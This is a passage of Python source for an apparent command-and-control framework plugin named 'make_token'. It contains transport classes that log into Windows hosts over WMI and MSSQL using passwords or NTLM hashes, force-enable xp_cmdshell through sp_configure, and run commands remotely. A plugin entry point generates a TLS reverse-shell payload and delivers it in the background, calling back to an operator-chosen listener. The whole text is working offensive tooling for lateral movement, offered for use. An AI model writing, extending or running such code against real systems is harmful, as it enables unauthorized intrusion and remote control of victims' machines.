                cmd.extend(['--port', str(port)])
            if ntlm_hash:
                cmd.extend(['-H', ntlm_hash])
            elif password:
                cmd.extend(['-p', password])
            else:
                raise RemoteTransportError("Password or NTLM hash required")
            cmd.extend(['-x', 'exit'])
            success, stdout, stderr = self._run_command(cmd, timeout=30)
            output = stdout + stderr
            if success or 'authenticated' in output.lower():
                self.connected = True
                return True
            else:
                raise RemoteTransportError(f"{self._nxc_cmd} WMI connection failed: {stderr.strip()}")
        except RemoteTransportError:
            raise
        except Exception as e:
            raise RemoteTransportError(f"{self._nxc_cmd} WMI connection failed: {e}")

    def execute_command(self, command: Union[str, Dict[str, str]], target_os: Optional[str] = None,
                        background: bool = False) -> Tuple[bool, str]:
        if not self.connected:
            return False, "Not connected"
        target_os = target_os or self._target_os or 'windows'
        if target_os != 'windows':
            return False, "WMI only supports Windows targets"
        if isinstance(command, dict):
            command = self._get_os_specific_command(command, target_os)
            if command is None:
                return False, f"No command found for OS: {target_os}"

        if self._use_nxc:
            try:
                cmd = [self._nxc_cmd, 'wmi', self._host, '-u', self._username]
                if self._ntlm_hash:
                    cmd.extend(['-H', self._ntlm_hash])
                elif self._password:
                    cmd.extend(['-p', self._password])
                else:
                    return False, "No authentication available"
                if self._port:
                    cmd.extend(['--port', str(self._port)])
                cmd.extend(['-x', command])
                timeout = 10 if background else 60
                success, stdout, stderr = self._run_command(cmd, timeout=timeout)
                if success:
                    return True, stdout
                else:
                    return False, stderr
            except Exception as e:
                return False, str(e)
        else:
            if not self._wmiexec_cmd:
                return False, "No wmiexec command available"
            host_spec = f"{self._host}:{self._port}" if self._port else self._host
            try:
                if self._password:
                    cmd = [self._wmiexec_cmd, f'{self._username}:{self._password}@{host_spec}', command]
                elif self._ntlm_hash:
                    cmd = [self._wmiexec_cmd, f'{self._username}@{host_spec}', '-hashes', f':{self._ntlm_hash}', command]
                else:
                    return False, "No authentication available"
                timeout = 10 if background else 60
                success, stdout, stderr = self._run_command(cmd, timeout=timeout)
                if success:
                    return True, stdout
                else:
                    return False, stderr
            except Exception as e:
                return False, str(e)

    def deliver_payload(self, payload: str, target_os: str) -> Tuple[bool, str]:
        return self.execute_command(payload, target_os, background=True)

    def close(self):
        self.connected = False
        self._host = self._username = self._password = self._target_os = None
        self._port = None
        self._ntlm_hash = None

    def _perform_platform_detection(self) -> str:
        return "windows"

class MSSQLTransport(RemoteTransport):
    """MSSQL transport using mssqlclient.py (impacket) or netexec/nxc.
    
    In netexec mode, we first try to enable xp_cmdshell using the built‑in
    'enable_cmdshell' module. If that fails, we fall back to the manual SQL
    approach (sp_configure).
    """
    
    def __init__(self):
        super().__init__()
        self._mssqlclient_cmd = None
        self._nxc_cmd = None
        self._netexec_available = False
        self._xp_cmdshell_enabled = False

    def _ensure_dependency(self):
        if self._check_command('mssqlclient.py'):
            self._mssqlclient_cmd = 'mssqlclient.py'
        elif self._check_command('impacket-mssqlclient'):
            self._mssqlclient_cmd = 'impacket-mssqlclient'
        else:
            self._mssqlclient_cmd = None

        if self._check_command('nxc'):
            self._nxc_cmd = 'nxc'
        elif self._check_command('netexec'):
            self._nxc_cmd = 'netexec'
        else:
            self._nxc_cmd = None
        self._netexec_available = self._nxc_cmd is not None

        if not (self._mssqlclient_cmd or self._netexec_available):
            raise RemoteTransportError(
                "MSSQL requires either 'mssqlclient.py' (or 'impacket-mssqlclient') from impacket, or 'nxc'/'netexec'. "
                "Install impacket: pip install impacket, or netexec: pip install netexec"
            )

    def connect(self, host: str, username: str, password: Optional[str] = None, **kwargs) -> bool:
        self._ensure_dependency()
        if kwargs.get('private_key'):
            raise RemoteTransportError("MSSQL does not support private key authentication")
        ntlm_hash = kwargs.get('ntlm_hash')
        use_nxc = kwargs.get('use_nxc', False)
        port = kwargs.get('port')
        if port is None:
            port = self.DEFAULT_PORTS['mssql']
        target_os = kwargs.get('target_os', 'windows')
        callback_host = kwargs.get('callback_host')
        callback_port = kwargs.get('callback_port')

        if not password and not ntlm_hash:
            raise RemoteTransportError("Password or NTLM hash required for MSSQL")

        self._host = host
        self._username = username
        self._password = password
        self._ntlm_hash = ntlm_hash
        self._target_os = target_os
        self._callback_host = callback_host
        self._callback_port = callback_port
        self._port = port
        self._use_nxc = use_nxc

        if self._use_nxc:
            if not self._netexec_available:
                raise RemoteTransportError("netexec/nxc not available for MSSQL")
            return self._connect_nxc(host, username, password, ntlm_hash, port)
        else:
            if not self._mssqlclient_cmd:
                raise RemoteTransportError("No mssqlclient command found (tried mssqlclient.py and impacket-mssqlclient)")
            return self._connect_mssqlclient(host, username, password, ntlm_hash, port)

    def _connect_mssqlclient(self, host: str, username: str, password: Optional[str] = None,
                             ntlm_hash: Optional[str] = None, port: Optional[int] = None) -> bool:
        host_spec = f"{host}:{port}" if port else host
        query = "SELECT 1"
        try:
            if password:
                cmd = [self._mssqlclient_cmd, f'{username}:{password}@{host_spec}', '-query', query]
            elif ntlm_hash:
                cmd = [self._mssqlclient_cmd, f'{username}@{host_spec}', '-hashes', f':{ntlm_hash}', '-query', query]
            else:
                raise RemoteTransportError("Password or NTLM hash required")
            success, stdout, stderr = self._run_command(cmd, timeout=30)
            if success and '1' in stdout:
                self.connected = True
                return True
            else:
                raise RemoteTransportError(f"{self._mssqlclient_cmd} connection failed: {stderr.strip()}")
        except RemoteTransportError:
            raise
        except Exception as e:
            raise RemoteTransportError(f"{self._mssqlclient_cmd} connection failed: {e}")

    def _connect_nxc(self, host: str, username: str, password: Optional[str] = None,
                     ntlm_hash: Optional[str] = None, port: Optional[int] = None) -> bool:
        try:
            cmd = [self._nxc_cmd, 'mssql', host, '-u', username]
            if port:
                cmd.extend(['--port', str(port)])
            if ntlm_hash:
                cmd.extend(['-H', ntlm_hash])
            elif password:
                cmd.extend(['-p', password])
            else:
                raise RemoteTransportError("Password or NTLM hash required")
            cmd.extend(['-q', 'SELECT 1'])
            success, stdout, stderr = self._run_command(cmd, timeout=30)
            output = stdout + stderr
            if success or 'authenticated' in output.lower():
                self.connected = True
                return True
            else:
                raise RemoteTransportError(f"{self._nxc_cmd} MSSQL connection failed: {stderr.strip()}")
        except RemoteTransportError:
            raise
        except Exception as e:
            raise RemoteTransportError(f"{self._nxc_cmd} MSSQL connection failed: {e}")

    def _enable_xp_cmdshell_with_module(self) -> bool:
        """Try to enable xp_cmdshell using netexec's enable_cmdshell module."""
        cmd = [self._nxc_cmd, 'mssql', self._host, '-u', self._username]
        if self._ntlm_hash:
            cmd.extend(['-H', self._ntlm_hash])
        elif self._password:
            cmd.extend(['-p', self._password])
        else:
            return False
        if self._port:
            cmd.extend(['--port', str(self._port)])
        cmd.extend(['-M', 'enable_cmdshell', '-o', 'ACTION=enable'])
        success, stdout, stderr = self._run_command(cmd, timeout=30)
        if success:
            verify_cmd = [self._nxc_cmd, 'mssql', self._host, '-u', self._username]
            if self._ntlm_hash:
                verify_cmd.extend(['-H', self._ntlm_hash])
            elif self._password:
                verify_cmd.extend(['-p', self._password])
            if self._port:
                verify_cmd.extend(['--port', str(self._port)])
            verify_cmd.extend(['-q', "EXEC xp_cmdshell 'echo 1'"])
            v_success, v_stdout, _ = self._run_command(verify_cmd, timeout=15)
            if v_success and '1' in v_stdout:
                return True
        return False

    def _enable_xp_cmdshell_manual(self) -> bool:
        """Enable xp_cmdshell using manual SQL commands (fallback)."""
        check_sql = "IF EXISTS (SELECT 1 FROM sys.configurations WHERE name='xp_cmdshell' AND value=1) SELECT 1 ELSE SELECT 0"
        success, output = self._execute_sql(check_sql)
        if success and '1' in output:
            return True
        enable_sql = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
        success, output = self._execute_sql(enable_sql)
        return success

    def _enable_xp_cmdshell(self) -> bool:
        """Try module first, then fallback to manual SQL."""
        if self._xp_cmdshell_enabled:
            return True
        if self._use_nxc and self._netexec_available:
            if self._enable_xp_cmdshell_with_module():
                self._xp_cmdshell_enabled = True
                return True
        if self._enable_xp_cmdshell_manual():
            self._xp_cmdshell_enabled = True
            return True
        return False

    def _execute_sql(self, sql: str) -> Tuple[bool, str]:
        """Execute arbitrary SQL query using the current transport."""
        if self._use_nxc:
            cmd = [self._nxc_cmd, 'mssql', self._host, '-u', self._username]
            if self._ntlm_hash:
                cmd.extend(['-H', self._ntlm_hash])
            elif self._password:
                cmd.extend(['-p', self._password])
            else:
                return False, "No authentication"
            if self._port:
                cmd.extend(['--port', str(self._port)])
            cmd.extend(['-q', sql])
            success, stdout, stderr = self._run_command(cmd, timeout=60)
            return success, stdout if success else stderr
        else:
            if not self._mssqlclient_cmd:
                return False, "No mssqlclient available"
            host_spec = f"{self._host}:{self._port}" if self._port else self._host
            if self._password:
                cmd = [self._mssqlclient_cmd, f'{self._username}:{self._password}@{host_spec}', '-query', sql]
            elif self._ntlm_hash:
                cmd = [self._mssqlclient_cmd, f'{self._username}@{host_spec}', '-hashes', f':{self._ntlm_hash}', '-query', sql]
            else:
                return False, "No authentication"
            success, stdout, stderr = self._run_command(cmd, timeout=60)
            return success, stdout if success else stderr

    def execute_command(self, command: Union[str, Dict[str, str]], target_os: Optional[str] = None,
                        background: bool = False) -> Tuple[bool, str]:
        if not self.connected:
            return False, "Not connected"

        target_os = target_os or self._target_os or 'windows'
        if target_os != 'windows':
            return False, "MSSQL command execution via xp_cmdshell is only supported on Windows targets"

        if isinstance(command, dict):
            command = self._get_os_specific_command(command, target_os)
            if command is None:
                return False, f"No command found for OS: {target_os}"

        if not self._enable_xp_cmdshell():
            return False, "Failed to enable xp_cmdshell"

        if self._use_nxc:
            sql = f"EXEC xp_cmdshell '{command}'"
            return self._execute_sql(sql)
        else:
            if not self._mssqlclient_cmd:
                return False, "No mssqlclient available"
            host_spec = f"{self._host}:{self._port}" if self._port else self._host
            try:
                if self._password:
                    cmd = [self._mssqlclient_cmd, f'{self._username}:{self._password}@{host_spec}', '-x', command]
                elif self._ntlm_hash:
                    cmd = [self._mssqlclient_cmd, f'{self._username}@{host_spec}', '-hashes', f':{self._ntlm_hash}', '-x', command]
                else:
                    return False, "No authentication"
                timeout = 10 if background else 60
                success, stdout, stderr = self._run_command(cmd, timeout=timeout)
                if success:
                    return True, stdout
                else:
                    return False, stderr
            except Exception as e:
                return False, str(e)

    def deliver_payload(self, payload: str, target_os: str) -> Tuple[bool, str]:
        return self.execute_command(payload, target_os, background=True)

    def close(self):
        self.connected = False
        self._host = self._username = self._password = self._target_os = None
        self._port = None
        self._ntlm_hash = None
        self._xp_cmdshell_enabled = False

    def _perform_platform_detection(self) -> str:
        return "windows"

def get_transport(protocol: str) -> RemoteTransport:
    transports = {
        'ssh': SSHTransport,
        'winrm': WinRMTransport,
        'smb': SMBTransport,
        'rdp': RDPTransport,
        'wmi': WMITransport,
        'mssql': MSSQLTransport,
    }
    if protocol.lower() not in transports:
        raise RemoteTransportError(f"Unsupported protocol: {protocol}")
    return transports[protocol.lower()]()


def validate_protocol_compatibility(protocol: str, target_platform: str) -> bool:
    supported = RemoteTransport.SUPPORTED_OS.get(protocol.lower(), [])
    platform_map = {
        'windows': 'windows', 'win': 'windows',
        'linux': 'linux', 'nix': 'linux', 'unix': 'linux',
        'macos': 'macos', 'mac': 'macos', 'darwin': 'macos',
    }
    norm = platform_map.get(target_platform.lower(), target_platform.lower())
    return norm in supported


def parse_make_token_args(args: list) -> Dict[str, Any]:
    parser = argparse.ArgumentParser(
        description='Make token - establish C2 session via remote protocol and deliver reverse shell payload (TLS)'
    )
    parser.add_argument('-x', '--protocol', required=True,
                        choices=['ssh', 'winrm', 'smb', 'rdp', 'wmi', 'mssql'],
                        help='Remote protocol to use')
    parser.add_argument('--os', required=True,
                        choices=['windows', 'linux', 'macos'],
                        help='Target operating system')
    parser.add_argument('-i', '--ip', required=True, help='Target IP address')
    parser.add_argument('-P', '--port', type=int, help='Custom port number (default: protocol default)')
    parser.add_argument('-u', '--username', required=True, help='Username for authentication')
    parser.add_argument('-p', '--password', help='Password for authentication')
    parser.add_argument('-c', '--key', help='SSH private key path (SSH only)')
    parser.add_argument('-H', '--hash', help='NTLM hash for authentication (SMB/RDP/WinRM)')
    parser.add_argument('--nxc', action='store_true', help='Use netexec tool instead of native protocol tools')
    parser.add_argument('-rh', '--callback-host', required=True,
                        help='Reverse shell listener host (TLS)')
    parser.add_argument('-rp', '--callback-port', required=True, type=int,
                        help='Reverse shell listener TLS port')

    try:
        parsed = parser.parse_args(args)

        if parsed.port and (parsed.port < 1 or parsed.port > 65535):
            raise RemoteTransportError("Port must be between 1 and 65535")

        if not validate_protocol_compatibility(parsed.protocol, parsed.os):
            raise RemoteTransportError(
                f"{parsed.protocol.upper()} is not compatible with {parsed.os} target"
            )

        if parsed.protocol == 'ssh':
            if not parsed.password and not parsed.key:
                raise RemoteTransportError("SSH requires either -p (password) or -c (key)")
            if parsed.hash:
                raise RemoteTransportError("SSH does not support NTLM hash")

        elif parsed.protocol == 'winrm':
            if parsed.key:
                raise RemoteTransportError("WinRM does not support private key")
            if not parsed.password and not parsed.hash:
                raise RemoteTransportError("WinRM requires either -p (password) or -H (hash)")
            if parsed.os != 'windows':
                raise RemoteTransportError("WinRM only supports Windows targets")

        elif parsed.protocol == 'smb':
            if parsed.key:
                raise RemoteTransportError("SMB does not support private key")
            if not parsed.password and not parsed.hash:
                raise RemoteTransportError("SMB requires either -p (password) or -H (hash)")

        elif parsed.protocol == 'rdp':
            if parsed.key:
                raise RemoteTransportError("RDP does not support private key")
            if not parsed.password and not parsed.hash:
                raise RemoteTransportError("RDP requires either -p (password) or -H (hash)")

        elif parsed.protocol == 'wmi':
            if parsed.key:
                raise RemoteTransportError("WMI does not support private key")
            if not parsed.password and not parsed.hash:
                raise RemoteTransportError("WMI requires either -p (password) or -H (hash)")
            if parsed.os != 'windows':
                raise RemoteTransportError("WMI only supports Windows targets")

        elif parsed.protocol == 'mssql':
            if parsed.key:
                raise RemoteTransportError("MSSQL does not support private key")
            if not parsed.password and not parsed.hash:
                raise RemoteTransportError("MSSQL requires either -p (password) or -H (hash)")
            if parsed.os != 'windows':
                raise RemoteTransportError("MSSQL with xp_cmdshell only supports Windows targets")

        return {
            'protocol': parsed.protocol,
            'os': parsed.os,
            'ip': parsed.ip,
            'port': parsed.port,
            'username': parsed.username,
            'password': parsed.password,
            'key': parsed.key,
            'hash': parsed.hash,
            'use_nxc': parsed.nxc,
            'callback_host': parsed.callback_host,
            'callback_port': parsed.callback_port,
        }
    except SystemExit:
        raise RemoteTransportError("Invalid arguments. See --help for usage.")


def format_make_token_report(data: Dict) -> str:
    lines = ['Make Token Result', '-' * 18]
    safe_fields = {
        'protocol': 'Protocol',
        'ip': 'IP',
        'port': 'Port',
        'username': 'Username',
        'platform': 'Platform',
        'status': 'Status',
        'tool': 'Tool',
        'auth_method': 'Auth Method',
        'callback_host': 'Callback Host',
        'callback_port': 'Callback Port',
    }
    for key, label in safe_fields.items():
        val = data.get(key)
        if val not in (None, ''):
            lines.append(f'{label:<14}{val}')
    if data.get('error'):
        lines.append(f"Error:         {data['error']}")
    if data.get('message'):
        lines.append(f"Message:       {data['message']}")
    return '\n'.join(lines)


@plugin.command(
    name='make_token',
    platforms=['linux', 'windows', 'unix'],
    description='Establish C2 session via remote protocol and deliver reverse shell payload (TLS)',
)
def run(session: SessionContext, args):
    session.log_event('make_token: execution started')

    try:
        params = parse_make_token_args(args)
    except RemoteTransportError as e:
        session.print(f"Argument error: {e}", 'red')
        session.log_plugin_result('make_token', '', 'argument_error')
        return 1

    protocol = params['protocol']
    target_os = params['os']
    ip = params['ip']
    port = params['port']
    username = params['username']
    password = params['password']
    key = params['key']
    ntlm_hash = params['hash']
    use_nxc = params['use_nxc']
    callback_host = params['callback_host']
    callback_port = params['callback_port']

    tool_info = ""
    if use_nxc:
        tool_info = " using netexec (nxc)"
    elif protocol == 'ssh':
        tool_info = " using ssh"
    elif protocol == 'winrm':
        tool_info = " using default WinRM tool (evil-winrm or netexec)"
    elif protocol == 'smb':
        tool_info = " using netexec/impacket"
    elif protocol == 'rdp':
        tool_info = " using netexec/xfreerdp"
    elif protocol == 'wmi':
        tool_info = " using netexec/impacket-wmiexec"
    elif protocol == 'mssql':
        tool_info = " using netexec/impacket-mssqlclient"

    try:
        transport = get_transport(protocol)
    except RemoteTransportError as e:
        session.print(f"Transport error: {e}", 'red')
        session.log_plugin_result('make_token', '', str(e))
        return 1

    try:
        auth_method = "password" if password else ("SSH key" if key else "NTLM hash" if ntlm_hash else "unknown")
        session.print(f"Connecting to {ip} via {protocol.upper()}{tool_info}...", 'yellow')

        connect_kwargs = {
            'private_key': key,
            'ntlm_hash': ntlm_hash,
            'use_nxc': use_nxc,
            'port': port,
            'target_os': target_os,
            'callback_host': callback_host,
            'callback_port': callback_port,
        }

        transport.connect(ip, username, password, **connect_kwargs)
        session.print(f"Connected successfully via {protocol.upper()}", 'green')
    except RemoteTransportError as e:
        result = {
            'protocol': protocol,
            'ip': ip,
            'username': username,
            'status': 'failed',
            'error': str(e),
            'callback_host': callback_host,
            'callback_port': callback_port,
        }
        if ntlm_hash:
            result['auth_method'] = 'NTLM hash'
        elif key:
            result['auth_method'] = 'SSH key'
        elif password:
            result['auth_method'] = 'password'
        session.print(format_make_token_report(result), 'red')
        session.log_plugin_result('make_token', format_make_token_report(result), str(e))
        transport.close()
        return 1

    try:
        detected_platform = transport.detect_platform()
        if detected_platform != "unknown":
            target_platform = detected_platform if detected_platform in ['windows', 'linux'] else target_os
        else:
            target_platform = target_os
        session.print(f"Target platform: {target_platform}", 'cyan')
    except Exception as e:
        transport.close()
        result = {
            'protocol': protocol,
            'ip': ip,
            'username': username,
            'status': 'failed',
            'error': f'Platform detection failed: {e}',
            'callback_host': callback_host,
            'callback_port': callback_port,
        }
        session.print(format_make_token_report(result), 'red')
        session.log_plugin_result('make_token', format_make_token_report(result), str(e))
        return 1

    if not validate_protocol_compatibility(protocol, target_platform):
        transport.close()
        error_msg = f"{protocol.upper()} is not compatible with {target_platform} target"
        result = {
            'protocol': protocol,
            'ip': ip,
            'username': username,
            'platform': target_platform,
            'status': 'failed',
            'error': error_msg,
            'callback_host': callback_host,
            'callback_port': callback_port,
        }
        session.print(format_make_token_report(result), 'red')
        session.log_plugin_result('make_token', format_make_token_report(result), error_msg)
        return 1

    session.print(f"Generating reverse shell payload for {target_platform} (TLS to {callback_host}:{callback_port})...", 'yellow')
    try:
        payload = transport._generate_payload(target_platform, callback_host, callback_port)
        session.print("Delivering payload in background...", 'yellow')
        success, output = transport.deliver_payload(payload, target_platform)
        if success:
            session.print("Payload delivered successfully! Reverse shell should connect back shortly.", 'green')
            result = {
                'protocol': protocol,
                'ip': ip,
                'username': username,
                'platform': target_platform,
                'status': 'success',
                'message': 'Reverse shell payload delivered (background)',
                'callback_host': callback_host,
                'callback_port': callback_port,
            }
            if use_nxc:
                result['tool'] = 'netexec (nxc)'
            elif protocol == 'winrm' and not use_nxc:
                result['tool'] = 'evil-winrm' if transport._evil_winrm_available else 'netexec'
            if ntlm_hash:
                result['auth_method'] = 'NTLM hash'
            elif key:
                result['auth_method'] = 'SSH key'
            elif password:
                result['auth_method'] = 'password'
            session.print(format_make_token_report(result), 'green')
            session.log_plugin_result('make_token', format_make_token_report(result), 'success')
        else:
            result = {
                'protocol': protocol,
                'ip': ip,
                'username': username,
                'platform': target_platform,
                'status': 'failed',
                'error': f'Payload execution failed: {output}',
                'callback_host': callback_host,
                'callback_port': callback_port,
            }
            session.print(format_make_token_report(result), 'red')
            session.log_plugin_result('make_token', format_make_token_report(result), output)
    except Exception as e:
        result = {
            'protocol': protocol,
            'ip': ip,
            'username': username,
            'platform': target_platform,
            'status': 'failed',
            'error': f'Payload delivery error: {e}',
            'callback_host': callback_host,
            'callback_port': callback_port,
        }
        session.print(format_make_token_report(result), 'red')
        session.log_plugin_result('make_token', format_make_token_report(result), str(e))

    transport.close()
    return 0 if success else 1
